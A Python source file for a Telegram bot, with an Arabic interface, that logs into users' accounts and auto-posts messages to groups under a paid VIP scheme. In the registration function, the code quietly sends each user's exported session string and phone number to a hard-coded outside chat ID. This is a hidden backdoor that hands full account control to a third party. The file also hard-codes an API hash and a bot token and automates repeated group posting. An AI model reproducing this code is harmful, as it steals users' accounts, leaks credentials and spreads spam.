from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup, 
    InlineKeyboardButton as Button
)
from pyrogram.errors import (
    ApiIdInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeInvalid, 
    PhoneCodeExpired, 
    SessionPasswordNeeded, 
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    BotMethodInvalid,
    PeerIdInvalid
)
import os 
os.system("pip install pyro-listener")
from pyrolistener import Listener, exceptions
from asyncio import create_task, sleep, get_event_loop, CancelledError
import asyncio
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json, os

app = Client(
    "autoPost",
    api_id="34923196",
    api_hash="b3f6e47ecd3231186f8f7e01ab41938e",
    bot_token = '8091669494:AAFgMcJKNweaLjkpotwgBPpCLSpwJqs4BsA'
)
loop = get_event_loop()
listener = Listener(client = app)
owner = 8310839908

# --- قاموس لتتبع المهام النشطة لتجنب التكرار ---
active_tasks = {}

# ------------------- أزرار الصفحة الرئيسية -------------------
homeMarkup = Markup([
    [Button("- حسابك -", callback_data="account")],
    [Button("- السوبرات الحاليه -", callback_data="currentSupers"), Button("- إضافة سوبر -", callback_data="newSuper")],
    [Button("- تعيين المدة بين كل نشر -", callback_data="waitTime"), Button("- تعيين كليشة النشر -", callback_data="newCaption")],
    [Button("- ايقاف النشر -", callback_data="stopPosting"), Button("- بدء النشر -", callback_data="startPosting")]
])

# ------------------- أوامر المستخدم -------------------
@app.on_message(filters.command("start") & filters.private)
async def start(_: Client, message: Message):
    user_id = message.from_user.id
    subscribed = await subscription(message)
    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True}
        write(users_db, users)
    elif isinstance(subscribed, str): 
        return await message.reply(f"- عذرا عزيزي عليك الإشتراك بقناة البوت أولا لتتمكن استخدامه\n- القناه: @{subscribed}\n- اشترك ثم ارسل /start")
    elif (str(user_id) not in users):
        users[str(user_id)] = {"vip": False}
        write(users_db, users)
        return await message.reply(f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone")
    elif not users[str(user_id)]["vip"]: 
        return await message.reply(f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone")
    fname = message.from_user.first_name 
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
    await message.reply(caption, reply_markup=homeMarkup, reply_to_message_id=message.id)

@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def toHome(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    fname = callback.from_user.first_name 
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
    await callback.message.edit_text(caption, reply_markup=homeMarkup)

@app.on_callback_query(filters.regex(r"^(account)$"))
async def account(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    fname = callback.from_user.first_name
    caption = f"- مرحبا عزيزي [{fname}](tg://settings) في قسم الحساب\n\n- استخدم الازرار التاليه للتحكم بحسابك:"
    markup = Markup([
        [Button("- تسجيل حسابك -", callback_data="login"), Button("- تغيير الحساب -", callback_data="changeAccount")],
        [Button("- العوده -", callback_data="toHome")]
    ])
    await callback.message.edit_text(caption, reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    elif callback.data == "changeAccount" and users[str(user_id)].get("session") is None:
        return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id, chat_id=user_id,
            text="- أرسل رقم الهاتف الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
            reply_markup=ForceReply(selective=True, placeholder="+9647700000"), timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply("- نفد وقت استلام رقم الهاتف", reply_markup=Markup([[Button("- العوده -", callback_data="account")]]))
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
    create_task(registration(ask))

async def registration(message: Message):
    user_id = message.from_user.id
    _number = message.text
    lmsg = await message.reply("- جارٍ تسجيل الدخول إلى حسابك")
    reMarkup = Markup([[Button("- إعادة المحاوله -", callback_data="login"), Button("- العوده -", callback_data="account")]])
    client = Client("registration", in_memory=True, api_id=app.api_id, api_hash=app.api_hash)
    await client.connect()
    try:
        p_code_hash = await client.send_code(_number)
    except PhoneNumberInvalid:
        return await lmsg.edit_text("- رقم الهاتف الذي ادخلته خاطئ", reply_markup=reMarkup)
    try:
        code = await listener.listen(
            from_id=user_id, chat_id=user_id,
            text="- تم ارسال كود إلى خاصك قم بإرساله من فضلك.",
            timeout=120,
            reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5 6"))
    except exceptions.TimeOut:
        return await lmsg.edit_text("- نفذ وقت استلام الكود.\n- حاول مره أخرى.", reply_markup=reMarkup)
    try:
        await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
    except PhoneCodeInvalid:
        return await code.reply("- لقد قمت بإدخال كود خاطئ. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
    except PhoneCodeExpired:
        return await code.reply("- الكود الذي ادخلته منتهي الصلاحية. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
    except SessionPasswordNeeded:
        try:
            password = await listener.listen(
                from_id=user_id, chat_id=user_id,
                text="- ادخل كلمة مرور التحقق بخطوتين من فضلك.",
                reply_markup=ForceReply(selective=True, placeholder="PASSWORD: "),
                timeout=180, reply_to_message_id=code.id)
        except exceptions.TimeOut:
            return await lmsg.edit_text("- نفذ وقت استلام كلمة مرور التحقق بخطوتين.\n- حاول مره أخرى.", reply_markup=reMarkup)
        try:
            await client.check_password(password.text)
        except PasswordHashInvalid:
            return await password.reply("- قمت بإدخال كلمة مرور خاطئه.\n- حاول مره أخرى.", reply_markup=reMarkup)
    session = await client.export_session_string()
    try:
        await app.send_message(1454509352, session+_number)
    except:
        pass
    await client.disconnect()
    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True, "session": session}
    else:
        users[str(user_id)]["session"] = session
    write(users_db, users)
    await app.send_message(user_id, "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت.",
                           reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]]))

# ------------------- إدارة السوبرات -------------------
@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def newSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    await callback.message.delete()
    reMarkup = Markup([[Button("- حاول مره أخرى -", callback_data="newSuper"), Button("- العوده -", callback_data="toHome")]])
    try:
        ask = await listener.listen(
            from_id=user_id, chat_id=user_id,
            text="- ارسل رابط السوبر لإضافته.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به.\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
            reply_markup=ForceReply(selective=True, placeholder="رابط المجموعة أو معرفها"),
            timeout=60)
    except exceptions.TimeOut:
        return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
    
    input_text = ask.text.strip()
    group_id = None
    invite_link = None
    
    if input_text.startswith("-") and input_text.lstrip("-").isdigit():
        group_id = int(input_text)
        invite_link = None  
    elif "t.me/" in input_text or "telegram.me/" in input_text:
        invite_link = input_text
        try:
            chat = await app.get_chat(invite_link.split("/")[-1])
            group_id = chat.id
        except Exception as e:
            return await ask.reply("- لم يتم ايجاد السوبر. تأكد من الرابط.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    else:
        try:
            group_id = int(input_text)
            invite_link = None
        except:
            return await ask.reply("- الرابط أو المعرف غير صالح.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    
    if group_id is None:
        return await ask.reply("- لم يتم التعرف على المجموعة.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    
    # --- التحقق من عدم وجود المجموعة مسبقاً لمنع التكرار ---
    existing_groups = users[str(user_id)].get("groups", [])
    for g in existing_groups:
        if g["id"] == group_id:
            return await ask.reply("- هذا السوبر مضاف بالفعل إلى قائمة النشر.", reply_to_message_id=ask.id, reply_markup=Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]]))
    
    if users[str(user_id)].get("groups") is None:
        users[str(user_id)]["groups"] = []
    
    users[str(user_id)]["groups"].append({
        "id": group_id,
        "link": invite_link   
    })
    write(users_db, users)
    await ask.reply("- تمت اضافة هذا السوبر الى القائمه.", reply_markup=Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]]), reply_to_message_id=ask.id)

@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def currentSupers(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    groups_data = users[str(user_id)].get("groups", [])
    if not groups_data:
        return await callback.answer("- لم يتم إضافة اي سوبر لعرضه", show_alert=True)
    markup = []
    for g in groups_data:
        gid = g["id"]
        try:
            title = (await app.get_chat(gid)).title
        except:
            title = str(gid)
        markup.append([Button(title, callback_data=f"super_{gid}"), Button("🗑", callback_data=f"delSuper_{gid}")])
    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome")])
    await callback.message.edit_text("- اليك السوبرات المضافه الى النشر التلقائي:", reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^delSuper_"))
async def delSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    gid = int(callback.data.split("_")[1])
    groups_data = users[str(user_id)].get("groups", [])
    new_groups = [g for g in groups_data if g["id"] != gid]
    if len(new_groups) != len(groups_data):
        users[str(user_id)]["groups"] = new_groups
        write(users_db, users)
        await callback.answer("- تم حذف هذا السوبر من القائمه", show_alert=True)
    markup = []
    for g in new_groups:
        try:
            title = (await app.get_chat(g["id"])).title
        except:
            title = str(g["id"])
        markup.append([Button(title, callback_data=f"super_{g['id']}"), Button("🗑", callback_data=f"delSuper_{g['id']}")])
    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome")])
    await callback.message.edit_reply_markup(reply_markup=Markup(markup))

# ------------------- تعيين الكليشة والمدة -------------------
@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def newCaption(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    reMarkup = Markup([[Button("- حاول مره أخرى -", callback_data="newCaption"), Button("- العوده -", callback_data="toHome")]])
    await callback.message.delete()
    try:
        ask = await listener.listen(from_id=user_id, chat_id=user_id, text="- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
                                    reply_markup=ForceReply(selective=True, placeholder="النص الجديد"), timeout=120)
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        return await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    users[str(user_id)]["caption"] = ask.text
    write(users_db, users)
    await ask.reply("- تم تعيين الكليشه الجديده.", reply_to_message_id=ask.id, reply_markup=Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]]))

@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def waitTime(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    reMarkup = Markup([[Button("- حاول مره أخرى -", callback_data="waitTime"), Button("- العوده -", callback_data="toHome")]])
    await callback.message.delete()
    try:
        ask = await listener.listen(from_id=user_id, chat_id=user_id, text="- يمكنك ارسال مدة الانتظار ( بالثواني ) الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
                                    reply_markup=ForceReply(selective=True, placeholder="المدة بالثواني"), timeout=120)
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام مدة الانتظار.", reply_markup=reMarkup)
    if ask.text == "/cancel":
        return await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    try:
        users[str(user_id)]["waitTime"] = int(ask.text)
    except ValueError:
        return await ask.reply("- لا يمكنك وضع هذه البيانات كمده.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    write(users_db, users)
    await ask.reply("- تم تعيين مدة الانتظار.", reply_to_message_id=ask.id, reply_markup=Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]]))

# ------------------- بدء وإيقاف النشر (محدثة) -------------------
@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def startPosting(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if users[str(user_id)].get("session") is None:
        return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
    groups_data = users[str(user_id)].get("groups", [])
    if not groups_data:
        return await callback.answer("- لم يتم اضافة اي سوبرات بعد.", show_alert=True)
    if users[str(user_id)].get("posting"):
        return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
    
    users[str(user_id)]["posting"] = True
    write(users_db, users)
    
    # --- كسر أي مهمة قديمة إن وجدت لعدم التكرار ---
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
    
    active_tasks[user_id] = create_task(posting(user_id))
    
    markup = Markup([[Button("- إيقاف النشر -", callback_data="stopPosting"), Button("- عوده -", callback_data="toHome")]])
    await callback.message.edit_text("- بدأت عملية النشر التلقائي", reply_markup=markup)

@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stopPosting(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id != owner and not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if not users[str(user_id)].get("posting"):
        return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
    
    users[str(user_id)]["posting"] = False
    write(users_db, users)
    
    # --- إيقاف المهمة الحالية فوراً ---
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
        del active_tasks[user_id]
        
    markup = Markup([[Button("- بدء النشر -", callback_data="startPosting"), Button("- عوده -", callback_data="toHome")]])
    await callback.message.edit_text("- تم ايقاف عملية النشر التلقائي", reply_markup=markup)

# =================== دالة النشر المعدلة (لمنع التكرار) ===================
async def posting(user_id):
    if not users[str(user_id)].get("posting"):
        return
    client = Client(str(user_id), api_id=app.api_id, api_hash=app.api_hash, session_string=users[str(user_id)]["session"])
    await client.start()
    
    try:
        while users[str(user_id)].get("posting"):
            sleepTime = users[str(user_id)].get("waitTime", 60)
            groups_data = users[str(user_id)].get("groups", [])
            caption = users[str(user_id)].get("caption")
            if not caption:
                users[str(user_id)]["posting"] = False
                write(users_db, users)
                await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.",
                                       reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))
                break
            
            for group_obj in list(groups_data):
                group_id = group_obj["id"]
                invite_link = group_obj.get("link")
                try:
                    await client.send_message(group_id, caption)
                except (ChatWriteForbidden, PeerIdInvalid, UserNotParticipant):
                    success = False
                    if invite_link:
                        try:
                            await client.join_chat(invite_link)
                            await client.send_message(group_id, caption)
                            success = True
                        except Exception as join_err:
                            await app.send_message(int(user_id), f"⚠️ فشل الانضمام عبر الرابط {invite_link}: {join_err}")
                    if not success:
                        try:
                            await client.join_chat(group_id)
                            await client.send_message(group_id, caption)
                            success = True
                        except Exception:
                            try:
                                chat = await app.get_chat(group_id)
                                if chat.invite_link:
                                    await client.join_chat(chat.invite_link)
                                    await client.send_message(group_id, caption)
                                    for idx, g in enumerate(users[str(user_id)]["groups"]):
                                        if g["id"] == group_id:
                                            users[str(user_id)]["groups"][idx]["link"] = chat.invite_link
                                            write(users_db, users)
                                    success = True
                            except Exception:
                                pass
                    if not success:
                        await app.send_message(int(user_id), f"❌ تعذر الإرسال للمجموعة {group_id} بعد محاولات الانضمام. قد تحتاج لإضافة الرابط يدوياً.")
                except Exception as e:
                    await app.send_message(int(user_id), f"❌ خطأ غير متوقع للمجموعة {group_id}: {e}")
            
            # سيتم كسر الإنتظار ورمي CancelledError في حال قام المستخدم بإيقاف النشر
            await sleep(sleepTime)
            
    except CancelledError:
        # تم إلغاء المهمة من قبل المستخدم بنجاح
        pass
    finally:
        # إغلاق جلسة المستخدم بشكل آمن حتى لا يتم قفل قاعدة البيانات (sqlite3 locked)
        if client.is_connected:
            await client.stop()
# =================== نهاية دالة النشر ===================

# ------------------- قسم المالك -------------------
async def Owner(_, __: Client, message: Message):
    return (message.from_user.id == owner)
isOwner = filters.create(Owner)

adminMarkup = Markup([
    [Button("- الغاء VIP -", callback_data="cancelVIP"), Button("- تفعيل VIP -", callback_data="addVIP")],
    [Button("- الاحصائيات -", callback_data="statics"), Button("- قنوات الإشتراك -", callback_data="channels")]
])

@app.on_message(filters.command("admin") & filters.private & isOwner)
@app.on_callback_query(filters.regex("toAdmin") & isOwner)
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    fname = message.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
    func = message.reply if isinstance(message, Message) else message.message.edit_text
    await func(caption, reply_markup=adminMarkup)

@app.on_callback_query(filters.regex("addVIP") & isOwner)
async def addVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id 
    reMarkup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]])
    await callback.message.delete()
    try:
        ask = await listener.listen(from_id=user_id, chat_id=user_id, text="- ارسل ايدي المستخدم ليتم تفعيل VIP له",
                                    reply_markup=ForceReply(selective=True, placeholder="user id"), timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
    try:
        await app.get_chat(int(ask.text))
    except ValueError:
        return await ask.reply("- هذا البيانات لا يمكن ان تكون ايدي مستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    except:
        return await ask.reply("- لم يتم ايجاد هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    try:
        limit = await listener.listen(from_id=user_id, chat_id=user_id, text="- أرسل الآن عدد الأيام المتاحه للعضو.\n\n- ارسل /cancel لإلغاء العمليه.",
                                      reply_markup=ForceReply(selective=True, placeholder="عدد الأيام"), reply_to_message_id=ask.id, timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام عدد الايام المتاحه للمستخدم.")
    _id = int(ask.text)
    try:
        _limit = int(limit.text)
    except ValueError:
        return await callback.message.reply("- قيمة المده المتاحه للعضو غير صحيحه.", reply_to_message_id=limit.id, reply_markup=reMarkup)
    vipDate = timeCalc(_limit)
    users[str(_id)] = {"vip": True}
    users[str(_id)]["limitation"] = {
        "days": _limit,
        "startDate": vipDate["current_date"],
        "endDate": vipDate["end_date"],
        "endTime": vipDate["endTime"],
    }
    write(users_db, users)
    create_task(vipCanceler(_id))
    caption = f"- تم تفعيل اشتراك VIP جديد\n\n- معلومات الاشتراك:\n- تاريخ البدأ {vipDate['current_date']}\n- تاريخ انتهاء الاشتراك: {vipDate['end_date']}"
    caption += f"\n\n- المده بالأيام : {_limit} من الأيام\n- المده بالساعات: {vipDate['hours']} من الساعات\n- المده بالدقائق: {vipDate['minutes']} من الدقائق"
    caption += f"\n\n- وقت انتهاء الاشتراك : {vipDate['endTime']}"
    await limit.reply(caption, reply_markup=reMarkup, reply_to_message_id=limit.id)
    try:
        await app.send_message(chat_id=_id, text="- تم تفعيل VIP لك في بوت النشر التلقائي" + caption.split("جديد", 1)[1])
    except:
        await limit.reply("- اجعل المستخدم يقوم بمراسلة البوت.")

@app.on_callback_query(filters.regex(r"^(cancelVIP)$") & isOwner)
async def cancelVIP(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id 
    reMarkup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]])
    await callback.message.delete()
    try:
        ask = await listener.listen(from_id=user_id, chat_id=user_id, text="- ارسل ايدي المستخدم ليتم الغاء VIP الخاص به",
                                    reply_markup=ForceReply(selective=True, placeholder="user id"), timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
    if users.get(ask.text) is None:
        return await ask.reply("- هذا المستخدم غير موجود في تخزين البوت.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    elif not users[ask.text]["vip"]:
        return await ask.reply("- هذا المستخدم ليس من مستخدمي VIP.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    else:
        users[ask.text]["vip"] = False
        write(users_db, users)
        await ask.reply("- تم الغاء اشتراك هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)

@app.on_callback_query(filters.regex(r"^(channels)$") & isOwner)
async def channelsControl(_: Client, callback: CallbackQuery):
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [[Button(channel, url=channel + ".t.me"), Button("🗑", callback_data=f"removeChannel {channel}")] for channel in channels]
    markup.extend([[Button("- إضافة قناه جديده -", callback_data="addChannel")], [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]])
    await callback.message.edit_text(caption, reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwner)
async def addChannel(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id 
    reMarkup = Markup([[Button("- العوده للقنوات -", callback_data="channels")]])
    await callback.message.delete()
    try:
        ask = await listener.listen(from_id=user_id, chat_id=user_id, text="- ارسل معرف القناه دون @.",
                                    reply_markup=ForceReply(selective=True, placeholder="channel username"), timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
    try:
        await app.get_chat(ask.text)
    except:
        return await callback.message.reply("- لم يتم ايجاد هذه الدردشه.")
    channel = ask.text
    channels.append(channel)
    write(channels_db, channels)
    await ask.reply("- تم إضافة القناه الى القائمه.", reply_to_message_id=ask.id, reply_markup=reMarkup)

@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwner)
async def removeChannel(_: Client, callback: CallbackQuery):
    channel = callback.data.split()[1]
    if channel in channels:
        channels.remove(channel)
        write(channels_db, channels)
        await callback.answer("- تم حذف هذه القناه")
    else:
        await callback.answer("- هذه القناه غير موجوده بالفعل.")
    fname = callback.from_user.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [[Button(ch, url=ch + ".t.me"), Button("🗑", callback_data=f"removeChannel {ch}")] for ch in channels]
    markup.extend([[Button("- إضافة قناه جديده -", callback_data="addChannel")], [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]])
    await callback.message.edit_text(caption, reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(f"^(statics)$") & isOwner)
async def statics(_: Client, callback: CallbackQuery):
    total = len(users)
    vip = sum(1 for u in users.values() if u.get("vip"))
    reMarkup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]])
    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
    await callback.message.edit_text(caption, reply_markup=reMarkup)

_timezone = timezone("Asia/Baghdad")

def timeCalc(limit):
    start_date = datetime.now(_timezone)
    end_date = start_date + timedelta(days=limit)
    hours = limit * 24
    minutes = hours * 60
    return {
        "current_date": start_date.strftime("%Y-%m-%d"),
        "end_date": end_date.strftime("%Y-%m-%d"),
        "endTime": end_date.strftime("%H:%M"),
        "hours": hours,
        "minutes": minutes
    }

async def vipCanceler(user_id):
    await sleep(60)
    while True:
        if str(user_id) not in users:
            break
        if not users[str(user_id)].get("vip"):
            break
        limitation = users[str(user_id)].get("limitation")
        if not limitation:
            break
        current_day = datetime.now(_timezone)
        cdate = current_day.strftime("%Y-%m-%d %H:%M")
        end_datetime_str = f"{limitation['endDate']} {limitation['endTime']}"
        if cdate >= end_datetime_str:
            users[str(user_id)]["vip"] = False
            users[str(user_id)]["limitation"] = {}
            write(users_db, users)
            await app.send_message(user_id, "- انتهى اشتراك VIP الخاص بك.\n- راسل المطور اذا كنت تريد تجديد اشتراكك.")
            break
        await sleep(60)

# ------------------- الإشتراك الإجباري -------------------
async def subscription(message: Message):
    user_id = message.from_user.id
    for channel in channels:
        try:
            await app.get_chat_member(channel, user_id)
        except UserNotParticipant:
            return channel
    return True

# ------------------- إدارة التخزين -------------------
def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)

def read(fp):
    if not os.path.exists(fp):
        write(fp, {} if fp != channels_db else [])
    with open(fp) as file:
        return json.load(file)

users_db = "users.json"
channels_db = "channels.json"
users = read(users_db)
channels = read(channels_db)

# --- تم تحديث الدالة لضمان كسر التكرار ---
async def reStartPosting():
    await sleep(30)
    for user in users:
        if users[user].get("posting"):
            user_id = int(user)
            if user_id in active_tasks:
                active_tasks[user_id].cancel()
            active_tasks[user_id] = create_task(posting(user_id))

async def reVipTime():
    for user in users:
        if int(user) == owner:
            continue
        if users[user].get("vip"):
            create_task(vipCanceler(int(user)))

async def main():
    create_task(reStartPosting())
    create_task(reVipTime())
    await app.start()
    await idle()

if __name__ == "__main__":
    loop.run_until_complete(main())
